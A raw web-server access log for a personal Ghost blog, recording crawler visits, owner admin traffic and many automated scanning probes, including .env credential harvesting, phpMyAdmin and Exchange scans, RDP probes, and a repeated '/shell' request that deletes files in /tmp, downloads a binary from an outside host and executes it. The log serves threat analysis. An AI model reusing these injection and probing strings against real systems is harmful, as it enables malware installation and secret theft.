89.248.173.131 - - [20/Feb/2022:02:04:24 +0100] "GET /remote/login?lang=en HTTP/1.1" 200 595 "-" "python-requests/2.21.0"
130.211.54.158 - - [22/Feb/2022:00:26:54 +0100] "GET / HTTP/1.1" 400 248 "-" "python-requests/2.27.1"
162.142.125.221 - - [22/Feb/2022:00:38:29 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
162.142.125.221 - - [22/Feb/2022:00:38:29 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.221 - - [22/Feb/2022:00:38:29 +0100] "PRI * HTTP/2.0" 400 150 "-" "-"
162.142.125.221 - - [22/Feb/2022:00:38:30 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
45.5.201.27 - - [22/Feb/2022:01:16:26 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
192.241.212.143 - - [22/Feb/2022:01:20:08 +0100] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.209.45 - - [22/Feb/2022:01:24:45 +0100] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
165.16.57.164 - - [22/Feb/2022:01:29:52 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:12 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:12 +0100] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:12 +0100] "POST /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:13 +0100] "GET /admin/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:13 +0100] "POST /admin/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:13 +0100] "GET /api/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:13 +0100] "POST /api/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:13 +0100] "GET /app/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:13 +0100] "POST /app/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:14 +0100] "GET /backend/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:14 +0100] "POST /backend/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:14 +0100] "GET /demo/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:14 +0100] "POST /demo/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:14 +0100] "GET /dev/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:14 +0100] "POST /dev/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:15 +0100] "GET /staging/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:15 +0100] "POST /staging/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:15 +0100] "GET /public/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:15 +0100] "POST /public/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:15 +0100] "GET /public/admin/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:16 +0100] "POST /public/admin/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:16 +0100] "GET /public/api/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:16 +0100] "POST /public/api/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:16 +0100] "GET /public/app/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:16 +0100] "POST /public/app/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:16 +0100] "GET /public/backend/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:17 +0100] "POST /public/backend/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:17 +0100] "GET /public/demo/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:17 +0100] "POST /public/demo/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:17 +0100] "GET /public/dev/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:17 +0100] "POST /public/dev/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:18 +0100] "GET /public/staging/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Feb/2022:01:48:18 +0100] "POST /public/staging/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.236.47.223 - - [22/Feb/2022:01:52:13 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.236.47.223 - - [22/Feb/2022:01:52:14 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Forem Feeds Importer"
205.185.125.167 - - [22/Feb/2022:02:02:03 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
209.141.52.239 - - [22/Feb/2022:02:14:27 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
35.233.62.116 - - [22/Feb/2022:02:25:59 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.27.1"
209.141.62.127 - - [22/Feb/2022:02:39:58 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
66.249.69.59 - - [22/Feb/2022:03:03:48 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.59 - - [22/Feb/2022:03:03:48 +0100] "GET /sitemap.xml HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.88 - - [22/Feb/2022:03:16:15 +0100] "GET /weekly-stories-3/ HTTP/2.0" 200 15597 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [22/Feb/2022:03:16:36 +0100] "GET /assets/scripts/main.js?v=37bff49e5b HTTP/2.0" 200 9977 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.120 - - [22/Feb/2022:03:16:36 +0100] "GET /assets/styles/main.css?v=37bff49e5b HTTP/2.0" 200 14057 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.105.243.253 - - [22/Feb/2022:03:39:18 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.105.243.253 - - [22/Feb/2022:03:39:20 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.62.127 - - [22/Feb/2022:03:44:55 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
192.241.206.103 - - [22/Feb/2022:04:27:36 +0100] "GET /actuator/health HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
209.141.61.40 - - [22/Feb/2022:04:53:53 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
213.100.181.75 - - [22/Feb/2022:05:03:28 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
65.49.20.68 - - [22/Feb/2022:05:05:06 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
71.6.232.7 - - [22/Feb/2022:05:06:52 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
203.150.224.52 - - [22/Feb/2022:05:22:18 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 150 "-" "-"
62.233.50.179 - - [22/Feb/2022:05:26:11 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
178.73.215.171 - - [22/Feb/2022:06:10:33 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
174.87.134.197 - - [22/Feb/2022:06:11:11 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
3.236.47.223 - - [22/Feb/2022:06:50:58 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.236.47.223 - - [22/Feb/2022:06:50:58 +0100] "GET /rss/ HTTP/1.1" 200 3449 "-" "Forem Feeds Importer"
185.189.182.234 - - [22/Feb/2022:07:15:49 +0100] "GET / HTTP/1.1" 400 150 "-" "-"
205.185.125.167 - - [22/Feb/2022:07:35:12 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
31.220.3.140 - - [22/Feb/2022:07:54:46 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
157.230.216.203 - - [22/Feb/2022:08:00:18 +0100] "GET /ab2g HTTP/1.1" 400 150 "-" "-"
157.230.216.203 - - [22/Feb/2022:08:00:18 +0100] "GET /ab2h HTTP/1.1" 400 150 "-" "-"
157.55.39.156 - - [22/Feb/2022:08:28:16 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.126.156.108 - - [22/Feb/2022:08:51:55 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.57.7/.s4y/arm;sh+/tmp/arm HTTP/1.1" 301 162 "-" "Hello, world"
192.241.212.218 - - [22/Feb/2022:09:27:07 +0100] "GET /portal/redlion HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
62.233.50.179 - - [22/Feb/2022:09:43:35 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
198.199.114.240 - - [22/Feb/2022:09:52:40 +0100] "GET /actuator/health HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
192.241.201.94 - - [22/Feb/2022:10:23:55 +0100] "GET /hudson HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
23.90.160.114 - - [22/Feb/2022:10:35:42 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.61.19 - - [22/Feb/2022:11:05:51 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
192.241.211.186 - - [22/Feb/2022:11:08:31 +0100] "GET /owa/auth/x.js HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
173.249.53.50 - - [22/Feb/2022:11:08:40 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
173.249.53.50 - - [22/Feb/2022:11:08:41 +0100] "POST /HNAP1/ HTTP/1.1" 301 162 "-" "Mozila/5.0"
192.241.213.104 - - [22/Feb/2022:11:11:14 +0100] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.211.143 - - [22/Feb/2022:11:11:27 +0100] "GET /owa/auth/logon.aspx HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
104.206.128.62 - - [22/Feb/2022:11:15:03 +0100] "GET / HTTP/1.0" 301 162 "-" "https://gdnplus.com:Gather Analyze Provide."
192.241.210.45 - - [22/Feb/2022:11:27:08 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
2.56.57.187 - - [22/Feb/2022:11:47:11 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
59.127.240.56 - - [22/Feb/2022:11:49:59 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.57.7/.s4y/arm;sh+/tmp/arm HTTP/1.1" 301 162 "-" "Hello, world"
64.62.197.122 - - [22/Feb/2022:11:50:16 +0100] "GET / HTTP/1.1" 200 1345 "-" "-"
209.141.61.19 - - [22/Feb/2022:11:51:08 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
3.80.232.242 - - [22/Feb/2022:11:51:50 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.80.232.242 - - [22/Feb/2022:11:51:51 +0100] "GET /rss/ HTTP/1.1" 200 3449 "-" "Forem Feeds Importer"
52.42.211.189 - - [22/Feb/2022:11:53:55 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
172.105.161.246 - - [22/Feb/2022:12:05:03 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.213.6 - - [22/Feb/2022:12:06:56 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
223.27.83.106 - - [22/Feb/2022:12:15:04 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
188.137.82.207 - - [22/Feb/2022:12:27:07 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.53.170.243 - - [22/Feb/2022:12:27:37 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.53.170.243 - - [22/Feb/2022:12:27:37 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.156.72.10 - - [22/Feb/2022:12:28:45 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
185.156.72.10 - - [22/Feb/2022:12:28:45 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
80.13.79.134 - - [22/Feb/2022:13:18:01 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
34.91.81.96 - - [22/Feb/2022:13:24:31 +0100] "OPTIONS / HTTP/1.0" 405 150 "-" "-"
114.119.146.19 - - [22/Feb/2022:13:41:07 +0100] "GET /tag/weekly-stories/ HTTP/1.1" 200 13313 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
157.55.39.23 - - [22/Feb/2022:13:42:29 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.88 - - [22/Feb/2022:13:42:32 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
142.147.96.171 - - [22/Feb/2022:13:50:53 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.96.171 - - [22/Feb/2022:13:50:54 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
164.90.201.229 - - [22/Feb/2022:13:51:45 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
164.90.201.229 - - [22/Feb/2022:13:51:45 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
205.185.125.167 - - [22/Feb/2022:13:54:01 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
209.141.52.239 - - [22/Feb/2022:13:59:38 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
34.87.229.121 - - [22/Feb/2022:14:05:33 +0100] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03^\x1AD\x13I\xFA:\xF2\xC2\xEDW8c\xC2>Au\x13\xD2\xDEl\x844\x8A\xFA \x9E:\xDEj'\xF1 \xA1\xCB\x88qrM\xAF\x8E\xE7\xC3\xEF\x19\xEC\x03\x19\xC84U\x9C\xE72\xAD\x96`\xD1\xB1}" 400 150 "-" "-"
34.87.229.121 - - [22/Feb/2022:14:05:37 +0100] "OPTIONS / HTTP/1.0" 301 162 "-" "-"
181.217.65.70 - - [22/Feb/2022:14:30:42 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.57.7/.s4y/arm;sh+/tmp/arm HTTP/1.1" 301 162 "-" "Hello, world"
185.156.72.10 - - [22/Feb/2022:14:35:58 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
185.156.72.10 - - [22/Feb/2022:14:35:58 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
142.147.96.171 - - [22/Feb/2022:14:45:07 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.96.171 - - [22/Feb/2022:14:45:08 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.29.123.238 - - [22/Feb/2022:15:06:14 +0100] "GET /ghost/ HTTP/2.0" 200 1553 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:15 +0100] "GET /ghost/assets/img/medium-7359075af28d69523987ff4c0e2067c5.png HTTP/2.0" 499 0 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:15 +0100] "GET /ghost/assets/img/favicon.ico HTTP/2.0" 200 3781 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:15 +0100] "GET /ghost/api/canary/admin/users/me/?include=roles HTTP/2.0" 200 755 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:15 +0100] "GET /ghost/api/canary/admin/site/ HTTP/2.0" 200 339 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:15 +0100] "GET /ghost/api/canary/admin/config/ HTTP/2.0" 200 239 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:15 +0100] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1857 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:16 +0100] "GET /ghost/api/canary/admin/notifications/ HTTP/2.0" 200 378 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:16 +0100] "GET /ghost/api/canary/admin/members/events/?limit=5 HTTP/2.0" 200 13 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:16 +0100] "GET /ghost/api/canary/admin/members/stats/count/ HTTP/2.0" 200 42 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
83.29.123.238 - - [22/Feb/2022:15:06:16 +0100] "GET /ghost/api/canary/admin/products/?include=monthly_price%2Cyearly_price&limit=all HTTP/2.0" 200 344 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
